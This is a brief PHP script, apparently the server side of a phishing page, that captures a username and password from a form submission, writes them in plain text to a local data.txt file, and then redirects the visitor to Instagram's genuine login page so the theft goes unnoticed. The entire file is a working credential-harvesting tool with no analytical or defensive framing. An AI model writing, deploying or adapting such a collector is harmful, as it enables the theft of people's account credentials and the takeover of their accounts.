<?php


$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("data.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fclose($file);

header("Location: https://www.instagram.com/accounts/login/");
exit();
?>
